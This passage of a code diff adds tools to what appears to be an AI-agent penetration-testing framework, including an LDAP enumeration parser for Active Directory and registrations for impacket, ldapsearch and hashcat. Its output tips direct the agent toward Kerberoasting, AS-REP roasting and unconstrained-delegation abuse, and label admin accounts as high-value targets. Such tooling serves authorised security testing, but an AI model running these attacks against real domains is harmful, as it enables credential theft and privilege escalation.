+            return f"Command: {cmd_display}\n\nLDAP query timed out after 2 minutes"
+        except FileNotFoundError:
+            return "ldapsearch not installed. Install with:\n  sudo apt install ldap-utils  # Debian/Ubuntu\n  brew install openldap  # macOS"
+        except Exception as e:
+            return f"Error running ldapsearch: {str(e)}"
+
+    def _parse_ldap_output(self, output: str, cmd_display: str, query_type: Optional[str]) -> str:
+        """Parse and format ldapsearch output"""
+
+        formatted = []
+        formatted.append(f"Command: {cmd_display}")
+        formatted.append("")
+        
+        query_label = query_type.upper() if query_type else "LDAP"
+        formatted.append(f"{query_label} ENUMERATION RESULTS:")
+        formatted.append("─" * 80)
+
+        # Parse LDIF output
+        entries = []
+        current_entry = {}
+        
+        for line in output.split("\n"):
+            line = line.strip()
+            
+            # Skip comments and empty lines
+            if not line or line.startswith("#"):
+                continue
+            
+            # New entry marker
+            if line.startswith("dn:"):
+                if current_entry:
+                    entries.append(current_entry)
+                current_entry = {"dn": line[3:].strip()}
+            elif ":" in line and current_entry:
+                key, _, value = line.partition(":")
+                key = key.strip()
+                value = value.strip()
+                
+                # Handle multi-valued attributes
+                if key in current_entry:
+                    if isinstance(current_entry[key], list):
+                        current_entry[key].append(value)
+                    else:
+                        current_entry[key] = [current_entry[key], value]
+                else:
+                    current_entry[key] = value
+
+        # Don't forget the last entry
+        if current_entry:
+            entries.append(current_entry)
+
+        # Format based on query type
+        if entries:
+            formatted.append("")
+            formatted.append(f"ENTRIES FOUND: {len(entries)}")
+            formatted.append("")
+
+            # Show entries with relevant fields
+            for i, entry in enumerate(entries[:100], 1):  # Limit to 100 entries
+                if "sAMAccountName" in entry:
+                    name = entry.get("sAMAccountName", "")
+                    cn = entry.get("cn", "")
+                    formatted.append(f"  [{i}] {name} ({cn})")
+                    
+                    # Show extra info based on query type
+                    if query_type == "spns" and "servicePrincipalName" in entry:
+                        spns = entry["servicePrincipalName"]
+                        if isinstance(spns, list):
+                            for spn in spns[:3]:
+                                formatted.append(f"      SPN: {spn}")
+                        else:
+                            formatted.append(f"      SPN: {spns}")
+                    
+                    if query_type == "computers" and "operatingSystem" in entry:
+                        formatted.append(f"      OS: {entry.get('operatingSystem', 'Unknown')}")
+                    
+                    if query_type == "admins" and "memberOf" in entry:
+                        groups = entry["memberOf"]
+                        if isinstance(groups, list):
+                            formatted.append(f"      Groups: {len(groups)} memberships")
+                        else:
+                            formatted.append(f"      Group: {groups[:60]}...")
+                            
+                elif "cn" in entry:
+                    formatted.append(f"  [{i}] {entry.get('cn', 'Unknown')}")
+                elif "dn" in entry:
+                    formatted.append(f"  [{i}] {entry.get('dn', '')[:80]}")
+
+            if len(entries) > 100:
+                formatted.append(f"  ... and {len(entries) - 100} more entries")
+
+        else:
+            # Check for errors
+            if "Invalid credentials" in output or "invalid credentials" in output.lower():
+                formatted.append("")
+                formatted.append("ERROR: Invalid credentials")
+            elif "Can't contact LDAP server" in output:
+                formatted.append("")
+                formatted.append("ERROR: Cannot connect to LDAP server")
+            else:
+                formatted.append("")
+                formatted.append("No entries found or error occurred")
+                formatted.append("")
+                formatted.append("RAW OUTPUT:")
+                formatted.append(output[:2000])
+
+        # Add tips based on query type
+        if query_type:
+            formatted.append("")
+            formatted.append("─" * 80)
+            if query_type == "spns":
+                formatted.append("TIP: Found SPNs can be Kerberoasted with:")
+                formatted.append("  impacket script='GetUserSPNs' ... extra_args='-request'")
+            elif query_type == "asrep":
+                formatted.append("TIP: These accounts can be AS-REP roasted with:")
+                formatted.append("  impacket script='GetNPUsers' ... extra_args='-request'")
+            elif query_type == "unconstrained":
+                formatted.append("TIP: Unconstrained delegation can be abused for privilege escalation")
+            elif query_type == "admins":
+                formatted.append("TIP: These are high-value targets with adminCount=1")
+
+        return "\n".join(formatted)
+
+
 class BashExecutionInput(BaseModel):
     """Input for bash command execution"""
 
@@ -390,16 +1477,23 @@ class BashExecutionTool(BaseTool):
 
     name: str = "bash_execute"
     description: str = """
-    Execute bash commands for tasks not covered by specialized tools.
+    Execute simple bash commands for tasks not covered by specialized tools.
+    
+    IMPORTANT: Keep commands simple and single-line. No heredocs or multi-line scripts.
     
     Use this ONLY when:
     - You need to parse/filter output from other tools
     - You need to check if a tool is installed
-    - You need to perform file operations
+    - You need to perform simple file operations (cat, ls, grep)
+    - You need to save output to a file
     
     DO NOT use for:
-    - Network scanning (use nmap_scan instead)
-    - SMB enumeration (use netexec_smb instead)
+    - Network scanning (use nmap instead)
+    - SMB/WinRM enumeration (use netexec instead)
+    - LDAP enumeration (use ldapsearch instead)
+    - Impacket tools (use impacket instead)
+    - Password cracking (use hashcat instead)
+    - Complex multi-line commands or scripts
     
     Always provide a clear 'reason' for why the command is needed.
     """
@@ -431,6 +1525,9 @@ class BashExecutionTool(BaseTool):
 AVAILABLE_TOOLS = {
     "nmap": NmapScanTool(),
     "netexec": NetExecTool(),
+    "impacket": ImpacketTool(),
+    "ldapsearch": LdapsearchTool(),
+    "hashcat": HashcatTool(),
     "bash": BashExecutionTool(),
 }
 
